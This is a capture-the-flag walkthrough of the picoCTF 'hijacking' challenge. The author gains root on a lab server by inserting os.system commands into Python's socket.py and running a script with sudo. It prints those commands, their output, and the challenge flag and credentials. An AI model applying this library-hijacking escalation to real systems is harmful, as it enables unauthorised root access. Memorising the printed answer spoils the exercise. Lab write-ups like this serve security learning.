### [hijacking](https://play.picoctf.org/practice/challenge/352)

This one was tough and took me a lot of attempts :sob:

We are given access to a server that we are to connect using `ssh`. In the server, when we use `ls` command, we don't get any output. So lets use the `--all` and `--long` parameters along with the command.

```sh
ls -al
```

The output is

```sh
total 16
drwxr-xr-x 1 picoctf picoctf   20 Feb 24 16:05 .
drwxr-xr-x 1 root    root      21 Aug  4  2023 ..
-rw-r--r-- 1 picoctf picoctf  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 picoctf picoctf 3771 Feb 25  2020 .bashrc
drwx------ 2 picoctf picoctf   34 Feb 24 16:05 .cache
-rw-r--r-- 1 picoctf picoctf  807 Feb 25  2020 .profile
-rw-r--r-- 1 root    root     375 Mar 16  2023 .server.py
```

We are particularly interested in `.server.py`. So lets cat it.

```
cat .server.py
```

The output is

```python
import base64
import os
import socket
ip = 'picoctf.org'
response = os.system("ping -c 1 " + ip)
#saving ping details to a variable
host_info = socket.gethostbyaddr(ip)
#getting IP from a domaine
host_info_to_str = str(host_info[2])
host_info = base64.b64encode(host_info_to_str.encode('ascii'))
print("Hello, this is a part of information gathering",'Host: ', host_info)
```

When we run this file, we don't get any interesting output. As the hint of the challenge says, we need to find a way to access the administrator commands. We can do that by using the `os` module of python. But we can access it only from python's modules. So let's edit them. But first we gotta find where they are. We can do so by giving the following command.

    find / -name socket.py

We will eventually find the file.

    /usr/lib/python3.8/socket.py

We can edit this file and access the administrator commands. To do so, add the following line in `socket.py` code, on top.

    import os

    os.system('ls -al /challenge')

Now run the `.server.py` file with `sudo`.

    sudo python3 .server.py

We will get the following output.

```sh
total 4
d--------- 1 root root   6 Aug  4  2023 .
drwxr-xr-x 1 root root  51 Feb 24 16:05 ..
-rw-r--r-- 1 root root 103 Aug  4  2023 metadata.json
sh: 1: ping: not found
Traceback (most recent call last):
File "/home/picoctf/.server.py", line 7, in <module>
    host_info = socket.gethostbyaddr(ip)
socket.gaierror: [Errno -5] No address associated with hostname
```

Nice, now we know there's a file named `metadata.json` in that folder. Lets cat it by adding another line in `socket.py`

```python
os.system('cat challenge/metadata.json')
```

The output is

```sh
total 4
d--------- 1 root root   6 Aug  4  2023 .
drwxr-xr-x 1 root root  51 Feb 24 16:05 ..
-rw-r--r-- 1 root root 103 Aug  4  2023 metadata.json
{"flag": "picoCTF{pYth0nn_libraryH!j@CK!n9_566dbbb7}", "username": "picoctf", "password": "jyQXGXxIEP"}sh: 1: ping: not found
Traceback (most recent call last):
File "/home/picoctf/.server.py", line 7, in <module>
    host_info = socket.gethostbyaddr(ip)
socket.gaierror: [Errno -5] No address associated with hostname
```

Voila, the flag!

Flag: `picoCTF{pYth0nn_libraryH!j@CK!n9_566dbbb7}`
